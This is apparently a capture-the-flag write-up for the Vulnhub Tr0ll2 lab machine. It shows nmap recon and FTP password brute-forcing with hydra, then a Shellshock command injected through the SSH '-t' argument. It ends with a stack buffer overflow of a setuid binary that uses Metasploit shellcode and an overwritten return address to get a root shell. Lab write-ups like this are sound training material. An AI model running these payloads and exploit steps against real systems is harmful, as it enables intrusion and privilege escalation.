

# Information Gathering and Recon


### Netdiscover

```
 Currently scanning: 172.18.198.0/16   |   Screen View: Unique Hosts                                                                                          
                                                                                                                                                              
 42 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 2520                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.3.2        00:50:56:e9:96:a6     18    1080  VMware, Inc.                                                                                               
 10.0.3.138      00:0c:29:d0:df:2d      6     360  VMware, Inc.                                                                                               
 10.0.3.254      00:50:56:f3:99:fe      4     240  VMware, Inc.                                                                                               
 10.0.3.128      00:0c:29:6a:38:f5     12     720  VMware, Inc.                                                                                               
 10.0.3.137      00:0c:29:61:b0:a1      2     120  VMware, Inc.           
```


### NMAP

#### NMAP Command
```
nmap -T4 -A -v 10.0.3.138
```

#### NMAP Result

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-18 21:05 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Initiating ARP Ping Scan at 21:05
Scanning 10.0.3.138 [1 port]
Completed ARP Ping Scan at 21:05, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:05
Completed Parallel DNS resolution of 1 host. at 21:05, 0.02s elapsed
Initiating SYN Stealth Scan at 21:05
Scanning 10.0.3.138 [1000 ports]
Discovered open port 80/tcp on 10.0.3.138
Discovered open port 22/tcp on 10.0.3.138
Discovered open port 21/tcp on 10.0.3.138
Completed SYN Stealth Scan at 21:05, 0.17s elapsed (1000 total ports)
Initiating Service scan at 21:05
Scanning 3 services on 10.0.3.138
Completed Service scan at 21:05, 11.02s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.0.3.138
NSE: Script scanning 10.0.3.138.
Initiating NSE at 21:05
Completed NSE at 21:05, 2.82s elapsed
Initiating NSE at 21:05
Completed NSE at 21:05, 0.01s elapsed
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Nmap scan report for 10.0.3.138
Host is up (0.0013s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:D0:DF:2D (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Uptime guess: 0.002 days (since Sun Apr 18 21:02:47 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.34 ms 10.0.3.138

NSE: Script Post-scanning.
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Initiating NSE at 21:05
Completed NSE at 21:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1021 (41.673KB)

```



### Nikto
![](https://i.imgur.com/ufDZF98.png)




### Go to Webpage


![](https://i.imgur.com/GrooSUA.png)


> Check Page Source
![](https://i.imgur.com/8Peamh0.png)


> I like to first check if there is anything listed on `robots.txt`
![](https://i.imgur.com/KuYdDfO.png)



### FTP

```
┌─[✗]─[osboxes@parrot]─[/]
└──╼ $ftp 10.0.3.138
Connected to 10.0.3.138.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (10.0.3.138:osboxes): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> 
ftp> \
ftp> ^Z
[1]+  Stopped                 ftp 10.0.3.138

```

> Decided to FTP in browser so I can download the zip file
![](https://i.imgur.com/BFKl5dg.png)


![](https://i.imgur.com/PcdLhX4.png)


![](https://i.imgur.com/SWdxaTV.png)


![](https://i.imgur.com/eKMxMOh.png)


![](https://i.imgur.com/Ve675Fk.png)

> Attempt to crack
![](https://i.imgur.com/P3fAZwG.png)


![](https://i.imgur.com/QJOrqiq.png)

![](https://i.imgur.com/8sltSPy.png)

![](https://i.imgur.com/IJURIE2.png)

![](https://i.imgur.com/fehZ5aM.png)

![](https://i.imgur.com/ZiA66Yj.png)

![](https://i.imgur.com/tu0cNnM.png)

![](https://i.imgur.com/kJVdDBM.png)

![](https://i.imgur.com/P0gorMq.png)


> Strings the images
![](https://i.imgur.com/bqvNBi4.png)


![](https://i.imgur.com/lcoXQl8.png)

> y0ur_self
![](https://i.imgur.com/lk39b6d.png)


![](https://i.imgur.com/rlzeTmP.png)


```shell
for word in `cat answer.txt`; do echo $word | base64 -d; done > answer-decoded.txt
```



```
sort -u answer-decoded.txt > answer-decoded-nodup.txt
sort -u ubuntu-dict.txt > ubuntu-dict-nodup.txt
```

![](https://i.imgur.com/83JYEix.png)


```
diff ubuntu-dict-nodup.txt -u answer-decoded-nodup.txt > diff.txt
cat diff.txt
--- ubuntu-dict-nodup.txt  2021-04-18 06:25:08.083151991 -0400
+++ answer-decoded-nodup.txt    2021-04-18 06:25:21.103151724 -0400
@@ -2326,7 +2326,6 @@
 angry
 angst
 angstrom
-Ångström
 angstroms

... (truncated) ...

@@ -34174,6 +34161,7 @@
 italics
 Italy
 Itasca
+ItCantReallyBeThisEasyRightLOL
 itch
 itched
 itches
@@ -43524,6 +43512,7 @@
 noon
 noonday
 noontime
+noooob_lol
 noose
 nooses
 Nootka
@@ -67180,6 +67169,7 @@
 trolleys
 trollies
 trolling
+trollololol
 trollop
 Trollope
 trollops
```


> So the following were added
```
ItCantReallyBeThisEasyRightLOL
noooob_lol
trollololol
```



```
hydra -t 30 -L answer-decoded-nodup.txt -P answer-decoded-nodup.txt 10.0.3.138 ftp -e nsr -f

```


```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (http://www.thc.org/thc-hydra) starting at 2021-04-18 21:42:16
[DATA] 30 tasks, 1 server, 990 login tries (l:30/p:33), ~33 tries per task
[DATA] attacking service ftp on port 21

[STATUS] 620.00 tries/min, 620 tries in 00:01h, 370 todo in 00:01h, 30 active
[21][ftp] host: 10.0.3.138   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 10.0.3.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-04-18 21:43:38
```


![](https://i.imgur.com/3yFypNF.png)


![](https://i.imgur.com/n4Wng2p.png)


![](https://i.imgur.com/mOpm6hJ.png)



```
┌─[root@parrot]─[/home/osboxes/Desktop/Vulnhub/Tr0ll2]
└──╼ #ssh noob@10.0.3.138 -i noob 
load pubkey "noob": invalid format
The authenticity of host '10.0.3.138 (10.0.3.138)' can't be established.
ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.3.138' (ECDSA) to the list of known hosts.
TRY HARDER LOL!
Connection to 10.0.3.138 closed.
┌─[root@parrot]─[/home/osboxes/Desktop/Vulnhub/Tr0ll2]
└──╼ #ssh noob@10.0.3.138 -i noob -t "/bin/sh"
load pubkey "noob": invalid format
TRY HARDER LOL!
Connection to 10.0.3.138 closed.
┌─[root@parrot]─[/home/osboxes/Desktop/Vulnhub/Tr0ll2]
└──╼ #ssh noob@10.0.3.138 -i noob -t "bash --noprofile"
load pubkey "noob": invalid format
TRY HARDER LOL!
Connection to 10.0.3.138 closed.
┌─[root@parrot]─[/home/osboxes/Desktop/Vulnhub/Tr0ll2]
└──╼ #ssh noob@10.0.3.138 -i noob -t "() { :; }; /bin/bash"
load pubkey "noob": invalid format
noob@Tr0ll2:~$ 
```

![](https://i.imgur.com/7OZdTRh.png)

```
noob@Tr0ll2:~$ 
noob@Tr0ll2:~$ ls
noob@Tr0ll2:~$ cd ../
noob@Tr0ll2:/home$ ls
maleus  noob  tr0ll
noob@Tr0ll2:/home$ cd ../
noob@Tr0ll2:/$ ls
bin   dev  home        lib         media  nothing_to_see_here  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    opt                  root  sbin  srv      tmp  var

```

```
noob@Tr0ll2:/$ cd nothing_to_see_here/
noob@Tr0ll2:/nothing_to_see_here$ ls
choose_wisely
noob@Tr0ll2:/nothing_to_see_here$ cd choose_wisely/
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
door1  door2  door3
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door
door1/ door2/ door3/ 
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door1
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ls
r00t
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ cd ../
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
door1  door2  door3
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door2
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ls
r00t
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t 
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t AAAAAAAAAAAAAA
AAAAAAAAAAAAAAnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ 
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t lol
lolnoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ 
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 400')
Segmentation fault
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ 
```


```

/usr/share/metasploit-framework/tools# ./pattern_create.rb 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

```

```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
```

```
/usr/share/metasploit-framework/tools# ./pattern_offset.rb 6a413969
[*] Exact match at offset 268
/usr/share/metasploit-framework/tools# 
```


```
/nothing_to_see_here/choose_wisely/door3$ ~/checksec.sh --file r00t 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t
```


```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Sun Apr 18 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ulimit -s unlimited
```


### Metasploit

```
msf > use payload/linux/x86/exec 
msf payload(exec) > show options

Module options (payload/linux/x86/exec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute

msf payload(exec) > set CMD /bin/sh
CMD => /bin/sh
msf payload(exec) > generate -b '\x00' -s 50
# linux/x86/exec - 120 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# NOP gen: x86/opty2
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/sh
buf = 
"\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8" +
"\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b" +
"\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14" +
"\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd" +
"\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03" +
"\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59" +
"\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1" +
"\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1" +
"\x48\x75\x66\x56\x01\x94\x45\xd8"
```



```
/nothing_to_see_here/choose_wisely/door3$ export EGG=$(python -c 'print "\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1\x48\x75\x66\x56\x01\x94\x45\xd8"')
```

```
#include <unistd.h>

void main()
{
    printf("EGG address 0x%lx\n", getenv("EGG"));
    return 0;
}
```


```
/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
EGG address 0xbffffe57
```

```
/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x57\xfe\xff\xbf"')
Segmentation fault
/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x67\xfe\xff\xbf"')
# whoami
root
```

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ gdb r00t 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
(gdb) run
Starting program: /nothing_to_see_here/choose_wisely/door3/r00t 
Usage: /nothing_to_see_here/choose_wisely/door3/r00t input
[Inferior 1 (process 2379) exited normally]
(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
```




















